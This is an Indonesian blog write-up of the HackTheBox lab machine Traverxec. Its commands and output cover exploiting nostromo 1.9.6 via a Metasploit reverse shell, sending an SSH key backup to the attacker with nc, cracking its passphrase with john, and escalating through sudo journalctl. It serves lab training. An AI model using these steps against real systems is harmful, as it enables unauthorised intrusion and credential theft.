---
title: "HackTheBox Machine - Traverxec"
classes: wide
header:
  teaser: /assets/images/htb-frame.png
search: false
categories: 
  - HackTheBox Machine
toc: true
toc_label: "Contents"
last_modified_at: 2020-04-12 14:51:00
---

![HTB Traversec](/assets/images/htb-machine-traversec/featured-image.jpg)

### Scanning
```
# nmap -sC -sV -T4 -p- -A 10.10.10.165
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-12 15:37 WIB
Nmap scan report for 10.10.10.165
Host is up (0.46s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.2 - 4.9 (92%), Linux 3.18 (90%), Crestron XPanel control system (90%), Linux 3.16 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   609.50 ms 10.10.14.1
2   610.88 ms 10.10.10.165

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 231.15 seconds
```
didapatkan informasi menarik pada port 80 dengan menggunakan server   `nostromo 1.9.6` dan untuk tampilan website nya seperti di bawah
![htb-traversec-website](/assets/images/htb-machine-traversec/website.png)

### Enumeration
untuk `nostromo 1.9.6` dapat dilihat ada beberapa list di `searchploit` dan `metasploit`

#### searchploit
```
# searchsploit nostromo 1.9.6
-----------------------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                    |  Path
                                                                                  | (/usr/share/exploitdb/)
-----------------------------------------------------------------------------------------------------------------------------
nostromo 1.9.6 - Remote Code Execution                                            | exploits/multiple/remote/47837.py
-----------------------------------------------------------------------------------------------------------------------------
Shellcodes: No Result
```
#### metasploit
```
# msfconsole
...
msf5 > search nostromo 1.9.6

Matching Modules
================

   #  Name                                       Disclosure Date  Rank    Check  Description
   -  ----                                       ---------------  ----    -----  -----------
   0  exploit/multi/http/nostromo_code_exec      2019-10-20       good    Yes    Nostromo Directory Traversal Remote Command Execution
   1  exploit/windows/ftp/absolute_ftp_list_bof  2011-11-09       normal  No     AbsoluteFTP 1.9.6 - 2.2.10 LIST Command Remote Buffer Overflow


msf5 > 
```
gunakan metasploit `exploit/multi/http/nostromo_code_exec` 

```
msf5 > use exploit/multi/http/nostromo_code_exec
msf5 exploit(multi/http/nostromo_code_exec) > options 

Module options (exploit/multi/http/nostromo_code_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80               yes       The target port (TCP)
   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)
   VHOST                     no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Unix In-Memory)


msf5 exploit(multi/http/nostromo_code_exec) > 
```

lakukan seting untuk `rhosts` dan `lhosts` 

```
msf5 exploit(multi/http/nostromo_code_exec) > set rhosts 10.10.10.165
rhosts => 10.10.10.165
msf5 exploit(multi/http/nostromo_code_exec) > set lhost 10.10.14.16
lhost => 10.10.14.16
msf5 exploit(multi/http/nostromo_code_exec) > exploit 

[*] Started reverse TCP handler on 10.10.14.16:4444 
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (10.10.14.16:4444 -> 10.10.10.165:48894) at 2020-04-12 15:59:03 +0700


whoami
www-data
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
pwd
/usr/bin
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
david:x:1000:1000:david,,,:/home/david:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin

```

selanjutnya didapatkan informasi mengenai `path` dan `user` yaitu `david:x:1000:1000:david,,,:/home/david:/bin/bash`, sebelum itu, ke path konfigurasi `nostromo` tersebut.

```
...(lanjutan dari output sebelumnya)
$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@traverxec:/usr/bin$ 
www-data@traverxec:/usr/bin$ cd /var
cd /var
www-data@traverxec:/var$ ls -la
ls -la
total 48
drwxr-xr-x 12 root root  4096 Oct 25 14:43 .
drwxr-xr-x 18 root root  4096 Oct 25 14:17 ..
drwxr-xr-x  2 root root  4096 Nov 12 06:25 backups
drwxr-xr-x  9 root root  4096 Oct 25 14:34 cache
drwxr-xr-x 26 root root  4096 Nov 12 04:56 lib
drwxrwsr-x  2 root staff 4096 May 13  2019 local
lrwxrwxrwx  1 root root     9 Oct 25 14:15 lock -> /run/lock
drwxr-xr-x  5 root root  4096 Apr 12 01:50 log
drwxrwsr-x  2 root mail  4096 Oct 25 14:15 mail
drwxr-xr-x  6 root root  4096 Oct 25 14:43 nostromo
drwxr-xr-x  2 root root  4096 Oct 25 14:15 opt
lrwxrwxrwx  1 root root     4 Oct 25 14:15 run -> /run
drwxr-xr-x  4 root root  4096 Oct 25 14:16 spool
drwxrwxrwt  3 root root  4096 Apr 12 01:50 tmp
www-data@traverxec:/var$ 
www-data@traverxec:/var$ cd nostromo
cd nostromo
www-data@traverxec:/var/nostromo$ ls -la
ls -la
total 24
drwxr-xr-x  6 root     root   4096 Oct 25 14:43 .
drwxr-xr-x 12 root     root   4096 Oct 25 14:43 ..
drwxr-xr-x  2 root     daemon 4096 Oct 27 16:12 conf
drwxr-xr-x  6 root     daemon 4096 Oct 25 17:11 htdocs
drwxr-xr-x  2 root     daemon 4096 Oct 25 14:43 icons
drwxr-xr-x  2 www-data daemon 4096 Apr 12 01:50 logs
www-data@traverxec:/var/nostromo$ cd conf 
cd conf
www-data@traverxec:/var/nostromo/conf$ ls -la
ls -la
total 20
drwxr-xr-x 2 root daemon 4096 Oct 27 16:12 .
drwxr-xr-x 6 root root   4096 Oct 25 14:43 ..
-rw-r--r-- 1 root bin      41 Oct 25 15:20 .htpasswd
-rw-r--r-- 1 root bin    2928 Oct 25 14:26 mimes
-rw-r--r-- 1 root bin     498 Oct 25 15:20 nhttpd.conf
www-data@traverxec:/var/nostromo/conf$ 
```

pada path `/var/nostromo` terdapat file konfigurasi server `nhttpd.conf`

```
www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf
cat nhttpd.conf
# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
www-data@traverxec:/var/nostromo/conf$ 
```

pada konfigurasi tersebut, di bagian `# HOMEDIRS [OPTIONAL]` terdapat mengenai path `homedirs   /home` dan `homedirs_public         public_www`

```
**lanjutan sebelumnya**
www-data@traverxec:/home$ cd david
cd david
www-data@traverxec:/home/david$ ls -la
ls -la
ls: cannot open directory '.': Permission denied
www-data@traverxec:/home/david$ ls -l
ls -l
ls: cannot open directory '.': Permission denied
www-data@traverxec:/home/david$ cd public_www
cd public_www
www-data@traverxec:/home/david/public_www$ ls -la
ls -la
total 16
drwxr-xr-x 3 david david 4096 Oct 25 15:45 .
drwx--x--x 5 david david 4096 Oct 25 17:02 ..
-rw-r--r-- 1 david david  402 Oct 25 15:45 index.html
drwxr-xr-x 2 david david 4096 Oct 25 17:02 protected-file-area
www-data@traverxec:/home/david/public_www$ 
```

untuk `list dir` pada path `david` hanya `public_www` yang dapat di akses, selanjutnya terdapat path `protected-file-area` yang terdapat file ssh untuk akses user

```
www-data@traverxec:/home/david/public_www$ ls -la
ls -la
total 16
drwxr-xr-x 3 david david 4096 Oct 25 15:45 .
drwx--x--x 5 david david 4096 Oct 25 17:02 ..
-rw-r--r-- 1 david david  402 Oct 25 15:45 index.html
drwxr-xr-x 2 david david 4096 Oct 25 17:02 protected-file-area
www-data@traverxec:/home/david/public_www$ cd protected-file-area
cd protected-file-area
www-data@traverxec:/home/david/public_www/protected-file-area$ ls -l
ls -l
total 4
-rw-r--r-- 1 david david 1915 Oct 25 17:02 backup-ssh-identity-files.tgz
www-data@traverxec:/home/david/public_www/protected-file-area$
```

ketika membuka website dengan path david pada browser dengan url `http://10.10.10.165/~david/protected-file-area/` dengan maksud ingin mendapatkan file `backup-ssh-identity-files.tgz`, namun tidak dapat diakses, harus menggunakan username dan password david

![david-protected-area](/assets/images/htb-machine-traversec/david-protected-area.png)

untuk mendapatkan file `backup-ssh-identity-files.tgz` pada sisi attacker menggunakan `nc` scommand shell `$ nc -lvp 3333 >backup-ssh-identity-files.tgz` dan pada sisi server `nc 10.10.14.16 3333 < backup-ssh-identity-files.tgz` 

![nc-lvp-3333](/assets/images/htb-machine-traversec/nc-lvp-3333.png)

setelah didapatkan file `backup-ssh-identity-files.tgz`, kemudian diekstrak, dan lihat file terhidden `/home/david/.ssh/`

![ssh-david](/assets/images/htb-machine-traversec/ssh_david.png)

lakukan crack pada file `/home/david/.ssh/id_rsa` dengan menggunakan `/usr/share/john/./ssh2john.py`

```
# /usr/share/john/./ssh2john.py id_rsa > id_rsa.hash
/usr/share/john/./ssh2john.py:103: DeprecationWarning: decodestring() is a deprecated alias since Python 3.1, use decodebytes()
  data = base64.decodestring(data)

# ls -la
...
-rw-r--r-- 1 twseptian twseptian  397 Oct 26 04:02 authorized_keys
-rw------- 1 twseptian twseptian 1766 Oct 26 04:02 id_rsa
-rw-r--r-- 1 root      root      2458 Apr 12 16:52 id_rsa.hash
-rw-r--r-- 1 twseptian twseptian  397 Oct 26 04:02 id_rsa.pub
...
```

brute force file id_rsa.hash menggunakan `john` dengan wordlists sejuta umat `/usr/share/wordlists/rockyou.txt`

```
$ john
John the Ripper 1.9.0-jumbo-1 OMP [linux-gnu 64-bit x86_64 AVX2 AC]
Copyright (c) 1996-2019 by Solar Designer and others
Homepage: http://www.openwall.com/john/

Usage: john [OPTIONS] [PASSWORD-FILES]
--single[=SECTION[,..]]    "single crack" mode, using default or named rules
--single=:rule[,..]        same, using "immediate" rule(s)
--wordlist[=FILE] --stdin  wordlist mode, read words from FILE or stdin
                  --pipe   like --stdin, but bulk reads, and allows rules
--loopback[=FILE]          like --wordlist, but extract words from a .pot file
--dupe-suppression         suppress all dupes in wordlist (and force preload)
--prince[=FILE]            PRINCE mode, read words from FILE
--encoding=NAME            input encoding (eg. UTF-8, ISO-8859-1). See also
                           doc/ENCODINGS and --list=hidden-options.
--rules[=SECTION[,..]]     enable word mangling rules (for wordlist or PRINCE
                           modes), using default or named rules
--rules=:rule[;..]]        same, using "immediate" rule(s)
--rules-stack=SECTION[,..] stacked rules, applied after regular rules or to
                           modes that otherwise don't support rules
--rules-stack=:rule[;..]   same, using "immediate" rule(s)
--incremental[=MODE]       "incremental" mode [using section MODE]
--mask[=MASK]              mask mode using MASK (or default from john.conf)
--markov[=OPTIONS]         "Markov" mode (see doc/MARKOV)
--external=MODE            external mode or word filter
--subsets[=CHARSET]        "subsets" mode (see doc/SUBSETS)
--stdout[=LENGTH]          just output candidate passwords [cut at LENGTH]
--restore[=NAME]           restore an interrupted session [called NAME]
--session=NAME             give a new session the NAME
--status[=NAME]            print status of a session [called NAME]
--make-charset=FILE        make a charset file. It will be overwritten
--show[=left]              show cracked passwords [if =left, then uncracked]
--test[=TIME]              run tests and benchmarks for TIME seconds each
--users=[-]LOGIN|UID[,..]  [do not] load this (these) user(s) only
--groups=[-]GID[,..]       load users [not] of this (these) group(s) only
--shells=[-]SHELL[,..]     load users with[out] this (these) shell(s) only
--salts=[-]COUNT[:MAX]     load salts with[out] COUNT [to MAX] hashes
--costs=[-]C[:M][,...]     load salts with[out] cost value Cn [to Mn]. For
                           tunable cost parameters, see doc/OPTIONS
--save-memory=LEVEL        enable memory saving, at LEVEL 1..3
--node=MIN[-MAX]/TOTAL     this node's number range out of TOTAL count
--fork=N                   fork N processes
--pot=NAME                 pot file to use
--list=WHAT                list capabilities, see --list=help or doc/OPTIONS
--format=NAME              force hash of type NAME. The supported formats can
                           be seen with --list=formats and --list=subformats

$ john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (id_rsa)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:04 DONE (2020-04-12 16:54) 0.2202g/s 3158Kp/s 3158Kc/s 3158KC/sa6_123..*7¡Vamos!
Session completed

```

didapatkan password `hunter` untuk user `david`, kemudian login remote ssh

```
# ssh -i id_rsa david@10.10.10.165
Enter passphrase for key 'id_rsa': 
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
Last login: Sun Apr 12 04:13:21 2020 from 10.10.14.46
david@traverxec:~$ 
david@traverxec:~$ ls -la
total 36
drwx--x--x 5 david david 4096 Oct 25 17:02 .
drwxr-xr-x 3 root  root  4096 Oct 25 14:32 ..
lrwxrwxrwx 1 root  root     9 Oct 25 16:15 .bash_history -> /dev/null
-rw-r--r-- 1 david david  220 Oct 25 14:32 .bash_logout
-rw-r--r-- 1 david david 3526 Oct 25 14:32 .bashrc
drwx------ 2 david david 4096 Apr 12 04:15 bin
-rw-r--r-- 1 david david  807 Oct 25 14:32 .profile
drwxr-xr-x 3 david david 4096 Oct 25 15:45 public_www
drwx------ 2 david david 4096 Oct 25 17:02 .ssh
-r--r----- 1 root  david   33 Oct 25 16:14 user.txt
david@traverxec:~$ cat user.txt 
7db0b48469....................
david@traverxec:~$ 
```

![user-flag](/assets/images/htb-machine-traversec/user-flag.png)

untuk flag user, dapat di lihat pada user.txt, selanjutnya mendapatkan akses root, dengan melakukan enumeration dari user david. setelah melakukan enumeration pada direktori `bin`

```
david@traverxec:~$ cd bin
david@traverxec:~/bin$ ls -la
total 16
drwx------ 2 david david 4096 Apr 12 04:15 .
drwx--x--x 5 david david 4096 Oct 25 17:02 ..
-r-------- 1 david david  802 Oct 25 16:26 server-stats.head
-rwx------ 1 david david  363 Oct 25 16:26 server-stats.sh
david@traverxec:~/bin$
```

terdapat file `server-stats.sh` dan lihat informasi menggunakan perintah `cat`

```
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

pada bagian `/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat` dan dilihat melakukan akses `journalctl` ketika dijalankan `/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service`

dapat dilihat seperti pada gambar berikut

![journal-ctl-root](/assets/images/htb-machine-traversec/root-flag.png)

**NOTE** perlu diketahui, ketika saya menjalankan `/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service` saat mode full screen atau full width tidak masuk ke akses journalctl tersebut, maka saya melakukan resize terminal kemudian mengeksekusi ulang `/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service`

Terima kasih kepada htbforum
